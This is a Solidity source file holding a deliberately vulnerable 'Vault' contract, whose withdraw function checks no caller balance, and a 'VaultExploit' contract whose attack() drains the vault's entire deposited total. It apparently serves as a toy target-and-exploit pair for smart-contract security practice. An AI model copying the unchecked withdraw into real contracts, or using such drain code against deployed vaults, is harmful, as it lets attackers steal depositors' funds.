// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Vault is IVault {
    uint256 public totalDeposited;

    function deposit() external payable {
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        totalDeposited -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }
}

contract VaultExploit {
    Vault private victimInstance;

    constructor(address _victim) {
        victimInstance = Vault(_victim);
    }

    function attack() external payable {
        victimInstance.withdraw(victimInstance.totalDeposited());
    }

    receive() external payable { }
}
